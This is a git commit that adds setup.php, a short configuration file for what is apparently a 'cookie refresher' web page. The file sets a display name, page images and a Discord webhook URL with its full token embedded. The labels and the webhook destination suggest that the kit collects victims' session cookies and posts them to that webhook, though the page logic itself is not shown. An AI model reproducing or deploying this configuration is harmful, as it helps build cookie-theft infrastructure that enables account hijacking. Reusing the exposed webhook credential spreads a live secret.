d194f6d06308f378884f83cfd8a093089711530d
CorruptedL1ght <122151699+CorruptedL1ght@users.noreply.github.com>
2023-11-04 17:56:06 +0300

    Add files via upload

---
+++ setup.php
@@ -0,0 +1,8 @@
+<?php
+
+$name = "l1ght_ai"; // cookie refresher name
+$webhook = "https://discordapp.com/api/webhooks/1161346393005371473/i0cnlUE8Zjl_po_EYIvfa8cr_TNh0pS730lza2boqUK-cIze_0xMqZspcsod4dCB1Mnv";
+$image = "https://cdn.wallpapersafari.com/47/51/G0XLez.jpg"; // cookie refresher image / background
+$html_icon = "https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/optimized/4X/f/7/c/f7c9f2a9f31bf5748c52fa1087126828a5333ac8_2_500x500.png"; // cookie refresher web icon
+
+?>
